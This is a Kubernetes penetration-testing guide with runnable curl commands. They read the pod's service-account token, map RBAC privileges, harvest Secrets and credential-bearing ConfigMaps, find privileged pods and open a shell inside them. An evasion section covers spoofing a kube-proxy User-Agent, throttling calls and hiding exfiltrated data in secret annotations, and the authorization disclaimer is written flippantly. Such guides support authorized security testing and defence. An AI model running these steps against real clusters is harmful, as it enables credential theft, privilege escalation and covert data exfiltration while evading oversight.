
# Kubernetes API Pentest Reference Guide (Beta)

Practical field guide for Kubernetes reconnaissance, RBAC review, and configuration discovery.  
Companion to the `kubernetes-api-pentest.sh` enumeration script.

---

## 🧭 API Resource Mapping

### Core API Group `/api/v1` – Critical for Initial Access
```
/api/v1/
├─ namespaces/            →  namespace discovery / isolation
├─ pods/                  →  container access, exec
├─ services/              →  service discovery, network topology
├─ endpoints/             →  backend enumeration
├─ configmaps/ ⚠️          →  configuration data (often credentials)
├─ secrets/ 🔴             →  credentials, certs, tokens (HIGH VALUE)
├─ persistentvolumes/     →  cluster storage definitions
├─ persistentvolumeclaims/→  namespace storage claims
├─ serviceaccounts/       →  identity & token sources
├─ nodes/                 →  infrastructure enumeration
├─ events/                →  audit / operational metadata
└─ limitranges/           →  quota / constraint objects
```

---

### Apps API `/apis/apps/v1` – Workload Intelligence
```
/apis/apps/v1/
├─ deployments/           →  application architecture
├─ replicasets/           →  scaling & availability
├─ daemonsets/            →  node‑level services (often privileged)
└─ statefulsets/          →  persistent workloads (databases, queues)
```

---

### RBAC API `/apis/rbac.authorization.k8s.io/v1` – Privilege Mapping
```
/apis/rbac.authorization.k8s.io/v1/
├─ roles/                 →  namespace permissions
├─ rolebindings/          →  permission assignments
├─ clusterroles/          →  cluster‑scope roles
└─ clusterrolebindings/   →  cluster‑wide privilege grants
```

---

### Networking & Policy
```
/apis/networking.k8s.io/v1/
├─ networkpolicies/       →  segmentation rules
└─ ingresses/             →  external HTTP(S) entrypoints
```

```
/apis/policy/v1/
├─ poddisruptionbudgets/  →  availability limitations
└─ podsecuritypolicies/   →  deprecated but often present
```

---

### Storage & Operations
```
/apis/storage.k8s.io/v1/
└─ storageclasses/        →  provisioners and default class
/api/v1/persistentvolumes →  persistent volume backing
```

---

### Security / OpenShift
```
/apis/security.openshift.io/v1/
├─ securitycontextconstraints/ → run‑as / privilege policies
└─ rangeallocations/            → UID/GID allocations
```

---

### Custom Resource APIs
Environment‑specific resources installed by operators or vendors:
```
/apis/{custom-group}/v1/
├─ certificates/         →  cert‑manager
├─ issuers/              →  certificate authorities
├─ prometheusrules/      →  Prometheus monitoring rules
└─ {org-specific}/       →  custom logic
```

---

## 🧩 Methodology

### Phase 1 – Discovery & Enumeration
**Goal:** determine cluster version, accessible namespaces, and token scope.

```bash
TOKEN=$(< /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(< /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://kubernetes.default.svc.cluster.local"

# Version discovery
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/version" | jq .

# What can this token do?
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": { "resourceAttributes": { "verb": "*", "resource": "*" } }
  }' | jq .

# Namespace enumeration
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'
```

---

### Phase 2 – Privilege Assessment (RBAC)
```bash
# Current ServiceAccount
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts/default" | jq .

# Roles in current namespace
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/roles" |
  jq '.items[].metadata.name'

# ClusterRoles (look for wildcard or secret verbs)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" |
  jq '.items[] |
      select(.rules[]?.resources[]? |
      test("secrets|pods/exec|\\*")) |
      .metadata.name'

# View current user’s role bindings
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/rolebindings" |
  jq '.items[] | select(.subjects[]?.name == "default")'
```

---

### Phase 3 – Secret & Credential Harvesting
```bash
# List Secrets (if allowed)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/secrets" | jq '.items[].metadata.name'

# Check ConfigMaps for sensitive data
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/configmaps" |
  jq '.items[] |
      select(.data|to_entries[]?|
             .value|test("password|token|key|secret";"i")) |
      .metadata.name'
```

---

### Phase 4 – Lateral Movement & Escalation
```bash
# Find privileged or host‑network pods
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/pods" |
  jq '.items[] |
      select(.spec.securityContext.privileged==true or
             .spec.hostNetwork==true or
             .spec.hostPID==true) |
      .metadata.name'

# Exec inside a pod (if permitted)
curl -sk -H "Authorization: Bearer $TOKEN" \
  -X POST "$APISERVER/api/v1/namespaces/{ns}/pods/{pod}/exec?command=/bin/sh&stdin=true&stdout=true&tty=true" \
  -H "Connection: Upgrade" -H "Upgrade: SPDY/3.1"
```

**Node Recon**
```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" |
  jq '.items[] |
      {node:.metadata.name,
       kubelet:.status.nodeInfo.kubeletVersion,
       os:.status.nodeInfo.osImage}'
```

---

### Phase 5 – Persistence & Misconfigurations
Common high‑risk configurations to look for:

| Check | API Path | Description |
|-------|-----------|-------------|
| Cluster‑admin bindings | `/apis/rbac.authorization.k8s.io/v1/clusterrolebindings` | find roleRef = `cluster-admin` |
| Exposed secrets | `/api/v1/secrets` | secrets missing RBAC or with “admin”, “root”, “master” names |
| Privileged pods | `/api/v1/pods` | hostNetwork / hostPID / privileged containers |
| Missing network isolation | `/apis/networking.k8s.io/v1/networkpolicies` | no entries → flat network |

---

### Phase 6 – Detection & Evasion
| Technique | Example |
|------------|----------|
| Change User‑Agent | `-H "User-Agent: kube-proxy/v1.29.0"` |
| Throttle requests | `sleep 5` between API calls |
| Blend traffic | Run through existing cluster proxy pods |
| Steganography / exfil | `kubectl annotate secret x corp.io/data="<b64>"` |

---

## ⚙️ Companion Automation Script

**`kubernetes-api-pentest.sh`**

* Enumerates all accessible namespaces  
* Lists ConfigMaps, Secrets, Pods, PVCs, Deployments, DaemonSets, Jobs, NetworkPolicies, and more  
* Optional `--deep` flag to fetch & save each readable object locally  
* Safe for read‑only ServiceAccounts — handles 403s and 404s gracefully  
* Outputs per‑namespace JSON to `./k8s‑pentest‑output/`

Example:
```bash
# quick scan
bash kubernetes-api-pentest.sh

# full deep read
bash kubernetes-api-pentest.sh --deep
```

---

## 🧰  Appendix

### Common API Roots
```
/apis/apps/v1
/apis/batch/v1
/apis/policy/v1
/apis/networking.k8s.io/v1
/apis/storage.k8s.io/v1
/apis/apiextensions.k8s.io/v1
```

### Generic curl Templates
```bash
# List
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/<group>/<version>/namespaces/<ns>/<resource>"

# Describe one
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/<group>/<version>/namespaces/<ns>/<resource>/<name>" | jq .
```

---

**Report Issues / Contributions:**  
Please open a PR or file an issue describing API‑group additions or new reconnaissance techniques.  

**Disclaimer:**  
Use responsibly and only against environments where you have explicit authorization, lol 

---

```mermaid
flowchart TD

    A([Start]) --> B[Phase 1 – Discovery & Enumeration]
    B -->|list /version, /namespaces, tokens| C[Phase 2 – Privilege Assessment]
    C -->|RBAC: roles · rolebindings · clusterroles| D[Phase 3 – Secrets & ConfigMaps]
    D -->|grep for password · key · token| E[Phase 4 – Lateral Movement]
    E -->|pods · exec · daemonsets · nodes| F[Phase 5 – Persistence / Misconfig]
    F -->|create SA · bindings · detect flat network| G[Phase 6 – Detection & Evasion]
    G -->|spoof UA · throttle API · hide payloads| H([Report & Export])
    H --> I([End])

    %% Context groups
    subgraph ENUM["Core Recon"]
        B
        C
    end
    subgraph EXPLOIT["Access & Privilege Escalation"]
        D
        E
        F
    end
    subgraph OPSEC["Defense / Evasion"]
        G
    end

    style A fill:#085,stroke:#000,stroke-width:1px
    style B fill:#0a8,stroke:#000,stroke-width:1px
    style C fill:#0a8,stroke:#000,stroke-width:1px
    style D fill:#fb6,stroke:#000,stroke-width:1px
    style E fill:#fc0,stroke:#000,stroke-width:1px
    style F fill:#fa0,stroke:#000,stroke-width:1px
    style G fill:#ccc,stroke:#000,stroke-width:1px
    style H fill:#8cf,stroke:#000,stroke-width:1px
    style I fill:#0a5,stroke:#000,stroke-width:1px
    
